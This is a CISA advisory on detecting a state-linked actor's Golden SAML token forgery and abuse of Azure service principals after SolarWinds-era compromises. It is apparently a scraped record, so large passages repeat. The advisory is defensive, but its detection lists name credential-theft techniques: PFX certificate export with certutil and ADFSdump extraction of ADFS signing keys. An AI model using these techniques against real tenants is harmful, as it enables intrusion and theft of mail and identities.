Stage 2: Using the forged authentication token to create configuration changes in the Service Provider, such as Azure AD (establishing a foothold)
After the threat actor has compromised the on-premises identity provider, they identify their next series of objectives by reviewing activity in the Microsoft Cloud activity space (Microsoft Azure and M365 tenants).
The threat actor uses the ability to forge authentication tokens to establish a presence in the cloud environment. The actor adds additional credentials to an existing service principal. Once the threat actor has impersonated a privileged Azure AD account, they are likely to further manipulate the Azure/M365 environment (action on objectives in the cloud).
Network defenders should take the following steps.
Stage 3: Acquiring an OAuth access token for the application using the forged credentials added to an existing application or service principal and calling APIs with the permissions assigned to that application
In some cases, the threat actor has been observed adding permissions to existing applications or service principals. Additionally the actor has been seen establishing new applications or service principals briefly and using them to add permissions to the existing applications or service principals, possibly to add a layer of indirection (e.g., using it to add a credential to another service principal, and then deleting it).[11]
Network defenders should use Sparrow to:
Stage 4: Once access has been established, the threat actor Uses Microsoft Graph API to conduct action on objectives from an external RESTful API (queries impersonating existing applications).
Network defenders should:
Microsoft Telemetry Nuances
The existing tools and techniques used to evaluate cloud-based telemetry sources present challenges not represented in traditional forensic techniques. Primarily, the amount of telemetry retention is far less than the traditional logging facilities of on-premises data sources. Threat actor activity that is more than 90 days old is unlikely to have been saved by traditional sources or be visible with the Microsoft M365 Management API or in the UAL.
Service principal logging is available using the Azure Portal via the ""Service Principal Sign-ins"" feature. Enable settings in the Azure Portal (see “Diagnostic Setting”) to ingest logs into Sentinel or a third-party security information and event management (SIEM) tool. An Azure Premium P1 or Premium P2 license is necessary to access this setting as well as other features, such as a log analytics workspace, storage account, or event hub.[12] These logs must be downloaded manually if not ingested by one of the methods listed in the Detection Methods section.
Global Administrator rights are often required by tools other than Hawk and Sparrow to evaluate M365 cloud security posture. Logging capability and visibility of data varies by licensing models and subscription to premium services, such as Microsoft Defender for O365 and Azure Sentinel. According to CrowdStrike, ""There was an inability to audit via API, and there is the requirement for global admin rights to view important information which we found to be excessive. Key information should be easily accessible.""[13]
Documentation for specific event codes, such as UserAuthenticationMethod 16457, which may indicate a suspicious SAML token forgery, is no longer available in the M365 Unified Access Log. Auditing narratives on some events no longer exist as part of core Microsoft documentation sources.
The use of industry-standard SIEMs for log detection is crucial for providing historical context for threat hunting in Microsoft cloud environments. Standard G3/E3 licenses only provide 90 days of auditing; with the advanced auditing license that is provided with a G5/E5 license, audit logs can be extended to retain information for a year. CISA notes that this license change is proactive, rather than reactive: it allows enhanced visibility and features for telemetry from the moment of integration but does not provide retroactive visibility on previous events or historical context.
A properly configured SIEM can provide:
Built-in tools, such as Microsoft Cloud Services and M365 applications, provide much of the same visibility available from custom tools and are mapped to the MITRE ATT&CK framework and easy-to-understand dashboards.[14] However, these tools often do not have the ability to pull historical data older than seven days. Therefore, storage solutions that appropriately meet governance standards and usability metrics for analysts for the SIEM must be carefully planned and arranged.

Ingest comma separated values (CSV) output from the Sparrow PowerShell script into Splunk.

Sparrow output will have the following default filenames, which should not be modified: AppUpdate_Operations_Export.csv,AppRoleAssignment_Operations_Export.csv, Consent_Operations_Export.csv, Domain_List.csv, Domain_Operations_Export.csv, FileItems_Operations_Export.csv, MailItems_Operations_Export.csv, PSLogin_Operations_Export.csv, PSMailbox_Operations_Export.csv, SAMLToken_Operations_Export.csv, ServicePrincipal_Operations_Export.csv


Copy and paste the contents of the .xml file (aviary.xml in the root directory) into a new dashboard.
Use the data selection filters to point to the indexed Sparrow data (see figure 1)
 

 Investigate high-value administrative accounts to detect anomalous or unusual activity (Global Admins).
Enable PowerShell logging, and evaluate PowerShell activity in the environment not used for traditional or expected purposes.

PowerShell logging does not reveal the exact cmdlet that was run on the tenant.


Look for users with unusual sign-in locations, dates, and times.
Check permissions of service principals and applications in M365/Azure AD.
Detect the frequency of resource access from unusual places. Use the tool to pivot to a trusted application and see if it is accessing mail or file items.
Review mailbox rules and recent mailbox rule changes.


Sparrow differs from CRT by looking for specific indicators of compromise associated with the recent attacks.
CRT focuses on the tenant’s Azure AD permissions and Exchange Online configuration settings instead of the unified audit log, which gives it a different output from Sparrow or Hawk.
CRT returns the same broad scope of application/delegated permissions for service principals and applications as Hawk.
As part of its investigation, Sparrow homes in on a narrow set of application permissions given to the Graph API, which is common to the recent attacks.
CRT looks at Exchange Online federation configuration and federation trust, while Sparrow focuses on listing Azure AD domains.
Among the items network defenders can use CRT to review are delegated permissions and application permissions, federation configurations, federation trusts, mail forwarding rules, service principals, and objects with KeyCredentials.


The IP address and Activity_ID in EventCode 410 and the Activity_ID and Instance_ID in EventCode 500.
Export-PfxCertificate or certutil-exportPFX in Event IDs 4103 and 4104, which may include detection of a certificate extraction technique.
Deleted certificate extraction with ADFSdump performed using Sysmon Event ID 18 with the pipe name \microsoft##wid\tsql\query (exclude processes regularly making this pipe connection on the machine).
Event ID 307 (The Federation Service configuration was changed), which can be correlated to relevant Event ID 510 with the same instance ID for change details (Event ID 510 with the same Instance ID could be more than one event per single Event ID 307 event).
Event ID 307 (The Federation Service configuration was changed), which can be correlated to relevant Event ID 510 with the same Instance ID for change details. (Event ID 510 with the same Instance ID could be more than one event per single Event ID 307 event.)

Review events, particularly searching for Configuration: Type: IssuanceAuthority where Property Value references an unfamiliar domain.


Possible activity of an interrogating ADFS host by using ADFS PowerShell plugins. Look for changes in the federation trust environment that would indicate new ADFS sources.
Audit the creation and use of service principal and application credentials. Sparrow will detect modifications to these credentials.

Look for unusual application usage, such as dormant or forgotten applications being used again.
Audit the assignment of credentials to applications that allow non-interactive sign-in by the application.


Look for unexpected trust relationships that have been added to Azure AD. (Download the last 30 days of non-interactive sign-ins from the Azure portal or use Azure Sentinel.).[10]
Use Hawk (and any sub-modules available) to run an investigation on a specific user. Hawk will provide IP addresses, sign-in data, and other data. Hawk can also track IP usage in concurrent login situations.
Review login details for administrator accounts (e.g., high-value administrative accounts, such as Global Admins). Look for unusual sign-in locations, dates, and times.
Review new token validation time periods with high values and investigate whether the changes are legitimate or a threat actor’s attempts to gain persistence.
Examine highly privileged accounts; specifically using sign-in logs, look for unusual sign-in locations, dates, and times.
Create a timeline for all credential changes.
Monitor changes in application credentials (the script will export into csv named AppUpdate_Operations_Export).
Detect service principal credentials change and service principal change (e.g., if an actor adds new permissions or expands existing permissions).

Export and view this activity via the ServicePrincipal_Operations_Export.


Record OAuth consent and consent to applications

Export and view this record via the Consent_Operations_Export file.


Investigate instances of excessive high permissions, including, but not limited to Exchange Online, Microsoft Graph, and Azure AD Graph.

Review Microsoft Graph API permissions granted to service principals.
Export and view this activity via the ApplicationGraphPermissions csv file.

Note: Hawk can also return the full list of service principal permissions for further investigation.


Review top actors and the amount of credential modifications performed.
Monitor changes in application credentials.


Identify manipulation of custom or third-party applications.

Network defenders should review the catalog of custom or third-party vendors with applications in the Microsoft tenant and perform the above interrogation principles on those applications and trusts.


Review modifications to federation trust settings.

Review new token validation time periods with high values and investigate whether this was a legitimate change or an attempt to gain persistence by the threat actor.

The script detects the escalation of privileges, including the addition of Service Principals (SP) to privileged roles. Export this data into csv called AppRoleAssignment_Operations_Export.




In MailItemsAccessed operations, found within the Unified Audit Log (UAL), review the application ID used (requires G5 or E5 license for this specific detail).
Query the specific application ID, using the Sparrow script’s app ID investigation capability to interrogate mail and file items accessed for that applicationID (Use the application ID utility for any other suspicious apps that require additional analysis.).
Check the permissions of an application in M365/Azure AD using Sparrow.

Hawk will return Azure_Application_Audit, and Sparrow will return ApplicationGraphPermissions.
Network defenders will see the IP address that Graph API uses.
Note: the Microsoft IP address may not show up as a virtual private server/anonymized endpoint.


Investigate a specific service principal, if it is a user-specific user account, in Hawk. This activity is challenging to see without Azure Sentinel or manually downloading and reviewing logs from the sign-in portal.
Longer term storage of log data.
Cross correlation of log data with endpoint data and network data (such as those produced by ADFS servers), endpoint detection and response data, and identity provider information.
Ability to query use of application connectors in Azure.




Contact Information

CISA encourages recipients of this report to contribute any additional information that they may have related to this threat. For any questions related to this report, please contact CISA at

1-888-282-0870 (From outside the United States: +1-703-235-8832)
central@cisa.dhs.gov (UNCLASS)
us-cert@dhs.sgov.gov (SIPRNET)
us-cert@dhs.ic.gov (JWICS)

CISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on the CISA/US-CERT homepage at http://www.us-cert.cisa.gov/.
Resources
Azure Active Directory Workbook to Assess Solorigate Risk: https://techcommunity.microsoft.com/t5/azure-active-directory-identity/azure-ad-workbook-to-help-you-assess-solorigate-risk/ba-p/2010718
Volexity - Dark Halo Leverages SolarWinds Compromise to Breach Organizations: https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/
How to Find Activity with Sentinel: https://www.verboon.info/2020/10/monitoring-service-principal-sign-ins-with-azuread-and-azure-sentinel/
Third-Party Walkthrough of the Attack: https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/
National Security Agency Advisory on Detecting Abuse of Authentication Mechanisms: https://media.defense.gov/2020/Dec/17/2002554125/-1/-1/0/AUTHENTICATION_MECHANISMS_CSA_U_OO_198854_20.PDF
Microsoft 365 App for Splunk: https://splunkbase.splunk.com/app/3786/
CISA Remediation Guidance: https://us-cert.cisa.gov/ncas/alerts/aa20-352a

References

[1] ZDNet: A Second Hacking Group has Targeted SolarWinds Systems 
[2] CISA: Supply Chain Compromise 
[3] Microsoft SolarWinds Post-Compromise Hunting with Azure Sentinel 
[4] Microsoft Solorigate Resource Center 
[5] Advanced Audit in Microsoft 365 
[6] Microsoft: Understanding “Solorigate’s” Identity IOCs 
[7] Detection and Hunting of Golden SAML Attack: 
[8] Ibid
[9] Ibid
[10] Microsoft: AADServicePrincipalSignInLogs
[11] Microsoft: Understanding “Solorigate’s” Identity IOCs 
[12] Azure Active Directory Sign-in Activity Reports
[13] CrowdStrike: CrowdStrike Launches Free Tool to Identify and Help Mitigate Risks in Azure Active Directory 
[14] Microsoft 365 App for Splunk 

Revisions

Initial version: January 8, 2021|February 4, 2021: Removed link and section for outdated product feedback form|April 8, 2021: Added Aviary Dashboard information|April 15, 2021: Added Attribution Statement






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0008', 'TA0009', 'TA0001', 'TA0004', 'T1110.003', 'T1552', 'TA0005', 'T1110.001'}","




Summary

This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
Updated April 15, 2021: The U.S. Government attributes this activity to the Russian Foreign Intelligence Service (SVR). Additional information may be found in a statement from the White House. For more information on SolarWinds-related activity, go to https://us-cert.cisa.gov/remediating-apt-compromised-networks and https://www.cisa.gov/supply-chain-compromise.
This Alert is a companion alert to AA20-352A: Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations. AA20-352A primarily focuses on an advanced persistent threat (APT) actor’s compromise of SolarWinds Orion products as an initial access vector into networks of U.S. Government agencies, critical infrastructure entities, and private network organizations. As noted in AA20-352A, the Cybersecurity and Infrastructure Security Agency (CISA) has evidence of initial access vectors in addition to the compromised SolarWinds Orion products.
This Alert also addresses activity—irrespective of the initial access vector leveraged—that CISA attributes to an APT actor. Specifically, CISA has seen an APT actor using compromised applications in a victim’s Microsoft 365 (M365)/Azure environment. CISA has also seen this APT actor utilizing additional credentials and Application Programming Interface (API) access to cloud resources of private and public sector organizations. These tactics, techniques, and procedures (TTPs) feature three key components:

Compromising or bypassing federated identity solutions;
Using forged authentication tokens to move laterally to Microsoft cloud environments; and
Using privileged access to a victim’s cloud environment to establish difficult-to-detect persistence mechanisms for Application Programming Interface (API)-based access.

This Alert describes these TTPs and offers an overview of, and guidance on, available open-source tools—including a CISA-developed tool, Sparrow—for network defenders to analyze their Microsoft Azure Active Directory (AD), Office 365 (O365), and M365 environments to detect potentially malicious activity.
Note: this Alert describes artifacts—presented by these attacks—from which CISA has identified detectable evidence of the threat actor’s initial objectives. CISA continues to analyze the threat actor’s follow-on objectives.

Technical Details

Frequently, CISA has observed the APT actor gaining Initial Access, to victims’ enterprise networks via compromised SolarWinds Orion products (e.g., Solorigate, Sunburst).,1, However, CISA is investigating instances in which the threat actor may have obtained initial access by Password Guessing, Password Spraying, and/or exploiting inappropriately secured administrative or service credentials (Unsecured Credentials,) instead of utilizing the compromised SolarWinds Orion products.
CISA observed this threat actor moving from user context to administrator rights for Privilege Escalation, within a compromised network and using native Windows tools and techniques, such as Windows Management Instrumentation (WMI), to enumerate the Microsoft Active Directory Federated Services (ADFS) certificate-signing capability. This enumeration allows threat actors to forge authentication tokens (OAuth) to issue claims to service providers—without having those claims checked against the identity provider—and then to move laterally to Microsoft Cloud environments (Lateral Movement,).
The threat actor has also used on-premises access to manipulate and bypass identity controls and multi-factor authentication. This activity demonstrates how sophisticated adversaries can use credentials from one portion of an organization to move laterally (Lateral Movement,) through trust boundaries, evade defenses and detection (Defense Evasion,), and steal sensitive data (Collection,).
This level of compromise is challenging to remediate and requires a rigorous multi-disciplinary effort to regain administrative control before recovering.

Mitigations

Detection
Guidance on identifying affected SolarWinds software is well documented.,2, However—once an organization identifies a compromise via SolarWinds Orion products or other threat actor TTPs—identifying follow-on activity for on-premises networks requires fine-tuned network and host-based forensics.
The nature of cloud forensics is unique due to the growing and rapidly evolving technology footprints of major vendors. Microsoft's O365 and M365 environments have built-in capabilities for detecting unusual activity. Microsoft also provides premium services (Advanced Threat Protection,ATP, and Azure Sentinel), which enable network defenders to investigate TTPs specific to the Solorigate activity.,3,
Detection Tools
CISA is providing examples of detection tools for informational purposes only. CISA does not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services does not constitute or imply their endorsement, recommendation, or favoring by CISA.
There are a number of open-source tools available to investigate adversary activity in Microsoft cloud environments and to detect unusual activity, service principals, and application activity.,4, Publicly available PowerShell tools that network defenders can use to investigate M365 and Microsoft Azure include:

CISA's Sparrow,
Open-source utility Hawk, and
CrowdStrike's Azure Reporting Tool (CRT).

Additionally, Microsoft's Office 365 Management API and Graph API provide an open interface for ingesting telemetry and evaluating service configurations for signs of anomalous activity and intrusion.
Note: these open-source tools are highlighted and explained to assist with on-site investigation and remediation in cloud environments but are not all-encompassing. Open source tools can be complemented by services such as Azure Sentinel, a Microsoft premium service that provides comprehensive analysis tools, including custom detections for the activity indicated.
General Guidance on Using Detection Tools

Audit the creation and use of service principal credentials. Look for unusual application usage, such as use of dormant applications.
Audit the assignment of credentials to applications that allow non-interactive sign-in by the application. Look for unexpected trust relationships added to the Azure Active Directory.
Download the interactive sign-ins from the Azure admin portal or use the Microsoft Sentinel product. Review new token validation time periods with high values and investigate whether it was a legitimate change or an attempt to gain persistence by a threat actor.

Sparrow
CISA created Sparrow to help network defenders detect possible compromised accounts and applications in the Azure/M365 environment. The tool focuses on the narrow scope of user and application activity endemic to identity- and authentication-based attacks seen recently in multiple sectors. It is neither comprehensive nor exhaustive of available data. It is intended to narrow a larger set of available investigation modules and telemetry to those specific to recent attacks on federated identity sources and applications.
(Updated April 8, 2021): CISA has also created ""Aviary,"" which is a companion Splunk dashboard that can assist in visualizing and reviewing the output of Sparrow. Network defenders can find Aviary on CISA's Sparrow GitHub page. CISA advises network defenders to perform the following actions to use Sparrow:

Use Sparrow to detect any recent domain authentication or federation modifications.

Domain and federation modification operations are uncommon and should be investigated.


Examine logs for new and modified credentials applied to applications and service principals; delineate for the credential type. Sparrow can be used to detect the modification of service principals and application credentials.

Create a timeline for all credential changes, focusing on recent wholesale changes.
Review the “top actors” for activity in the environment and the number of credential modifications performed.
Monitor changes in application and service principal credentials.
Investigate any instances of excessive permissions being granted, including, but not limited to, Exchange Online, Microsoft Graph, and Azure AD Graph.


Use Sparrow to detect privilege escalation, such as adding a service principal, user, or group to a privileged role.
Use Sparrow to detect OAuth consent and users’ consent to applications, which is useful for interpreting changes in adversary TTPs.
Use Sparrow to identify anomalous Security Assertion Markup Language (SAML) token sign-ins by pivoting on the unified audit log UserAuthenticationValue of 16457, which is an indicator of how a SAML token was built and is a potential indicator for forged SAML tokens.

Note that this TTP has not been the subject of significant published security research but may indicate an unusual usage of a token, such as guest access for external partners to M365 resources.


Review the PowerShell logs that Sparrow exports.

Review PowerShell mailbox sign-ins and validate that the logins are legitimate actions.
Review PowerShell usage for users with PowerShell in the environment.


Use Sparrow to check the Graph API application permissions of all service principals and applications in M365/Azure AD.

Investigate unusual activity regarding Microsoft Graph API permissions (using either the legacy https://graph.windows.net/ or https://graph.microsoft.com). Graph is used frequently as part of these TTPs, often to access and manipulate mailbox resources.


Review Sparrow’s listed tenant’s Azure AD domains, to see if the domains have been modified.
For customers with G5 or E5 licensing levels, review MailItemsAccessed for insight into what application identification (ID) was used for accessing users’ mailboxes. Use Sparrow to query for a specific application ID using the app id investigation capability, which will check to see if it is accessing mail or file items.

The MailItemsAccessed event provides audibility for mailbox data accessed via mail protocols or clients.
By analyzing the MailItemsAccessed action, incident responders can determine which user mailbox items have been accessed and potentially exfiltrated by a threat actor. This event will be recorded even in some situations where the message was not necessarily read interactively (e.g., bind or sync).,5,
The resulting suspicious application ID can provide incident responders with a pivot to detect other suspicious applications that require additional analysis.
Check for changes to applications with regards to the accessing of resources such as mail or file items.



(Updated April 8, 2021): Aviary can be used to assist with performing the above tasks. To install Aviary, after running Sparrow:

Ingest comma separated values (CSV) output from the Sparrow PowerShell script into Splunk.

Sparrow output will have the following default filenames, which should not be modified: AppUpdate_Operations_Export.csv, AppRoleAssignment_Operations_Export.csv, Consent_Operations_Export.csv, Domain_List.csv, Domain_Operations_Export.csv, FileItems_Operations_Export.csv, MailItems_Operations_Export.csv, PSLogin_Operations_Export.csv, PSMailbox_Operations_Export.csv, SAMLToken_Operations_Export.csv, ServicePrincipal_Operations_Export.csv


Copy and paste the contents of the .xml file (aviary.xml in the root directory) into a new dashboard.
Use the data selection filters to point to the indexed Sparrow data (see figure 1)


                                                                                                                    Figure 1: Data Selection Filters
 
Hawk
Hawk is an open-source, PowerShell-driven, community-developed tool network defenders can use to quickly and easily gather data from O365 and Azure for security investigations. Incident responders and network defenders can investigate specific user principals or the entire tenant. Data it provides include IP addresses and sign-in data. Additionally, Hawk can track IP usage for concurrent login situations.
Hawk users should review login details for administrator accounts and take the following steps.
CrowdStrike Azure Reporting Tool
CrowdStrike's Azure Reporting Tool (CRT) can help network defenders analyze their Microsoft Azure AD and M365 environment to help organizations analyze permissions in their Azure AD tenant and service configuration. This tool has minor overlap with Sparrow; it shows unique items, but it does not cover the same areas. CISA is highlighting this tool because it is one of the only free, open-source tools available to investigate this activity and could be used to complement Sparrow.
Detection Tool Distinctions
Detection Methods
Microsoft breaks the threat actor’s recent activity into four primary stages, which are described below along with associated detection methods. Microsoft describes these stages as beginning with all activity after the compromise of the on-premises identity solution, such as ADFS.,6,
Note: this step provides an entry vector to cloud technology environments, and is unnecessary when the threat actor has compromised an identity solution or credential that allows the APT direct access to the cloud(e.g., without leveraging the SolarWinds Orion vulnerability).
Stage 1: Forging a trusted authentication token used to access resources that trust the on-premises identity provider
These attacks (often referred to as “Golden Security Assertion Markup Language” attacks) can be analyzed using a combination of cloud-based and standard on-premises techniques.,7, For example, network defenders can use OAuth claims for specific principals made at the Azure AD level and compare them to the on-premises identity.
Export sign-in logs from the Azure AD portal and look at the Authentication Method field.
Note: at portal.azure.com, click on a user and review the authentication details (e.g., date, method, result). Without Sentinel, this is the only way to get these logs, which are critical for this effort.
Detection Method 1: Correlating service provider login events with corresponding authentication events in Active Directory Federation Services (ADFS) and Domain Controllers
Using SAML single sign-on, search for any logins to service providers that do not have corresponding event IDs 4769, 1200, and 1202 in the domain.
Detection Method 2: Identifying certificate export events in ADFS
Look for:
Detection Method 3: Customizing SAML response to identify irregular access
This method serves as prevention for the future (and would only detect future, not past, activity), as it helps identify irregularities from the point of the change forward. Organizations can modify SAML responses to include custom elements for each service provider to monitor and detect any anomalous requests.,8,
Detection Method 4: Detecting malicious ADFS trust modification
A threat actor who gains administrative access to ADFS can add a new, trusted ADFS rather than extracting the certificate and private key as part of a standard Golden SAML attack.,9,
Network defenders should look for:
Stage 2: Using the forged authentication token to create configuration changes in the Service Provider, such as Azure AD (establishing a foothold)
After the threat actor has compromised the on-premises identity provider, they identify their next series of objectives by reviewing activity in the Microsoft Cloud activity space (Microsoft Azure and M365 tenants).
The threat actor uses the ability to forge authentication tokens to establish a presence in the cloud environment. The actor adds additional credentials to an existing service principal. Once the threat actor has impersonated a privileged Azure AD account, they are likely to further manipulate the Azure/M365 environment (action on objectives in the cloud).
Network defenders should take the following steps.
Stage 3: Acquiring an OAuth access token for the application using the forged credentials added to an existing application or service principal and calling APIs with the permissions assigned to that application
In some cases, the threat actor has been observed adding permissions to existing applications or service principals. Additionally the actor has been seen establishing new applications or service principals briefly and using them to add permissions to the existing applications or service principals, possibly to add a layer of indirection (e.g., using it to add a credential to another service principal, and then deleting it).,11,
Network defenders should use Sparrow to:
Stage 4: Once access has been established, the threat actor Uses Microsoft Graph API to conduct action on objectives from an external RESTful API (queries impersonating existing applications).
Network defenders should:
Microsoft Telemetry Nuances
The existing tools and techniques used to evaluate cloud-based telemetry sources present challenges not represented in traditional forensic techniques. Primarily, the amount of telemetry retention is far less than the traditional logging facilities of on-premises data sources. Threat actor activity that is more than 90 days old is unlikely to have been saved by traditional sources or be visible with the Microsoft M365 Management API or in the UAL.
Service principal logging is available using the Azure Portal via the ""Service Principal Sign-ins"" feature. Enable settings in the Azure Portal (see “Diagnostic Setting”) to ingest logs into Sentinel or a third-party security information and event management (SIEM) tool. An Azure Premium P1 or Premium P2 license is necessary to access this setting as well as other features, such as a log analytics workspace, storage account, or event hub.,12, These logs must be downloaded manually if not ingested by one of the methods listed in the Detection Methods section.
Global Administrator rights are often required by tools other than Hawk and Sparrow to evaluate M365 cloud security posture. Logging capability and visibility of data varies by licensing models and subscription to premium services, such as Microsoft Defender for O365 and Azure Sentinel. According to CrowdStrike, ""There was an inability to audit via API, and there is the requirement for global admin rights to view important information which we found to be excessive. Key information should be easily accessible."",13,
Documentation for specific event codes, such as UserAuthenticationMethod 16457, which may indicate a suspicious SAML token forgery, is no longer available in the M365 Unified Access Log. Auditing narratives on some events no longer exist as part of core Microsoft documentation sources.
The use of industry-standard SIEMs for log detection is crucial for providing historical context for threat hunting in Microsoft cloud environments. Standard G3/E3 licenses only provide 90 days of auditing; with the advanced auditing license that is provided with a G5/E5 license, audit logs can be extended to retain information for a year. CISA notes that this license change is proactive, rather than reactive: it allows enhanced visibility and features for telemetry from the moment of integration but does not provide retroactive visibility on previous events or historical context.
A properly configured SIEM can provide:
Built-in tools, such as Microsoft Cloud Services and M365 applications, provide much of the same visibility available from custom tools and are mapped to the MITRE ATT&CK framework and easy-to-understand dashboards.,14, However, these tools often do not have the ability to pull historical data older than seven days. Therefore, storage solutions that appropriately meet governance standards and usability metrics for analysts for the SIEM must be carefully planned and arranged.

Ingest comma separated values (CSV) output from the Sparrow PowerShell script into Splunk.

Sparrow output will have the following default filenames, which should not be modified: AppUpdate_Operations_Export.csv,AppRoleAssignment_Operations_Export.csv, Consent_Operations_Export.csv, Domain_List.csv, Domain_Operations_Export.csv, FileItems_Operations_Export.csv, MailItems_Operations_Export.csv, PSLogin_Operations_Export.csv, PSMailbox_Operations_Export.csv, SAMLToken_Operations_Export.csv, ServicePrincipal_Operations_Export.csv


Copy and paste the contents of the .xml file (aviary.xml in the root directory) into a new dashboard.
Use the data selection filters to point to the indexed Sparrow data (see figure 1)
 

 Investigate high-value administrative accounts to detect anomalous or unusual activity (Global Admins).
Enable PowerShell logging, and evaluate PowerShell activity in the environment not used for traditional or expected purposes.

PowerShell logging does not reveal the exact cmdlet that was run on the tenant.


Look for users with unusual sign-in locations, dates, and times.
Check permissions of service principals and applications in M365/Azure AD.
Detect the frequency of resource access from unusual places. Use the tool to pivot to a trusted application and see if it is accessing mail or file items.
Review mailbox rules and recent mailbox rule changes.


Sparrow differs from CRT by looking for specific indicators of compromise associated with the recent attacks.
CRT focuses on the tenant’s Azure AD permissions and Exchange Online configuration settings instead of the unified audit log, which gives it a different output from Sparrow or Hawk.
CRT returns the same broad scope of application/delegated permissions for service principals and applications as Hawk.
As part of its investigation, Sparrow homes in on a narrow set of application permissions given to the Graph API, which is common to the recent attacks.
CRT looks at Exchange Online federation configuration and federation trust, while Sparrow focuses on listing Azure AD domains.
Among the items network defenders can use CRT to review are delegated permissions and application permissions, federation configurations, federation trusts, mail forwarding rules, service principals, and objects with KeyCredentials.


The IP address and Activity_ID in EventCode 410 and the Activity_ID and Instance_ID in EventCode 500.
Export-PfxCertificate or certutil-exportPFX in Event IDs 4103 and 4104, which may include detection of a certificate extraction technique.
Deleted certificate extraction with ADFSdump performed using Sysmon Event ID 18 with the pipe name \microsoft##wid\tsql\query (exclude processes regularly making this pipe connection on the machine).
Event ID 307 (The Federation Service configuration was changed), which can be correlated to relevant Event ID 510 with the same instance ID for change details (Event ID 510 with the same Instance ID could be more than one event per single Event ID 307 event).
Event ID 307 (The Federation Service configuration was changed), which can be correlated to relevant Event ID 510 with the same Instance ID for change details. (Event ID 510 with the same Instance ID could be more than one event per single Event ID 307 event.)

Review events, particularly searching for Configuration: Type: IssuanceAuthority where Property Value references an unfamiliar domain.


Possible activity of an interrogating ADFS host by using ADFS PowerShell plugins. Look for changes in the federation trust environment that would indicate new ADFS sources.
Audit the creation and use of service principal and application credentials. Sparrow will detect modifications to these credentials.

Look for unusual application usage, such as dormant or forgotten applications being used again.
Audit the assignment of credentials to applications that allow non-interactive sign-in by the application.


Look for unexpected trust relationships that have been added to Azure AD. (Download the last 30 days of non-interactive sign-ins from the Azure portal or use Azure Sentinel.).,10,
Use Hawk (and any sub-modules available) to run an investigation on a specific user. Hawk will provide IP addresses, sign-in data, and other data. Hawk can also track IP usage in concurrent login situations.
Review login details for administrator accounts (e.g., high-value administrative accounts, such as Global Admins). Look for unusual sign-in locations, dates, and times.
Review new token validation time periods with high values and investigate whether the changes are legitimate or a threat actor’s attempts to gain persistence.
Examine highly privileged accounts; specifically using sign-in logs, look for unusual sign-in locations, dates, and times.
Create a timeline for all credential changes.
Monitor changes in application credentials (the script will export into csv named AppUpdate_Operations_Export).
Detect service principal credentials change and service principal change (e.g., if an actor adds new permissions or expands existing permissions).

Export and view this activity via the ServicePrincipal_Operations_Export.


Record OAuth consent and consent to applications

Export and view this record via the Consent_Operations_Export file.


Investigate instances of excessive high permissions, including, but not limited to Exchange Online, Microsoft Graph, and Azure AD Graph.

Review Microsoft Graph API permissions granted to service principals.
Export and view this activity via the ApplicationGraphPermissions csv file.

Note: Hawk can also return the full list of service principal permissions for further investigation.


Review top actors and the amount of credential modifications performed.
Monitor changes in application credentials.


Identify manipulation of custom or third-party applications.

Network defenders should review the catalog of custom or third-party vendors with applications in the Microsoft tenant and perform the above interrogation principles on those applications and trusts.


Review modifications to federation trust settings.

Review new token validation time periods with high values and investigate whether this was a legitimate change or an attempt to gain persistence by the threat actor.

The script detects the escalation of privileges, including the addition of Service Principals (SP) to privileged roles. Export this data into csv called AppRoleAssignment_Operations_Export.




In MailItemsAccessed operations, found within the Unified Audit Log (UAL), review the application ID used (requires G5 or E5 license for this specific detail).
Query the specific application ID, using the Sparrow script’s app ID investigation capability to interrogate mail and file items accessed for that applicationID (Use the application ID utility for any other suspicious apps that require additional analysis.).
Check the permissions of an application in M365/Azure AD using Sparrow.

Hawk will return Azure_Application_Audit, and Sparrow will return ApplicationGraphPermissions.
Network defenders will see the IP address that Graph API uses.
Note: the Microsoft IP address may not show up as a virtual private server/anonymized endpoint.


Investigate a specific service principal, if it is a user-specific user account, in Hawk. This activity is challenging to see without Azure Sentinel or manually downloading and reviewing logs from the sign-in portal.
Longer term storage of log data.
Cross correlation of log data with endpoint data and network data (such as those produced by ADFS servers), endpoint detection and response data, and identity provider information.
Ability to query use of application connectors in Azure.




Contact Information

CISA encourages recipients of this report to contribute any additional information that they may have related to this threat. For any questions related to this report, please contact CISA at

1-888-282-0870 (From outside the United States: +1-703-235-8832)
central@cisa.dhs.gov (UNCLASS)
us-cert@dhs.sgov.gov (SIPRNET)
us-cert@dhs.ic.gov (JWICS)

CISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on the CISA/US-CERT homepage at http://www.us-cert.cisa.gov/.
Resources
Azure Active Directory Workbook to Assess Solorigate Risk: https://techcommunity.microsoft.com/t5/azure-active-directory-identity/azure-ad-workbook-to-help-you-assess-solorigate-risk/ba-p/2010718
Volexity - Dark Halo Leverages SolarWinds Compromise to Breach Organizations: https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/
How to Find Activity with Sentinel: https://www.verboon.info/2020/10/monitoring-service-principal-sign-ins-with-azuread-and-azure-sentinel/
Third-Party Walkthrough of the Attack: https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/
National Security Agency Advisory on Detecting Abuse of Authentication Mechanisms: https://media.defense.gov/2020/Dec/17/2002554125/-1/-1/0/AUTHENTICATION_MECHANISMS_CSA_U_OO_198854_20.PDF
Microsoft 365 App for Splunk: https://splunkbase.splunk.com/app/3786/
CISA Remediation Guidance: https://us-cert.cisa.gov/ncas/alerts/aa20-352a

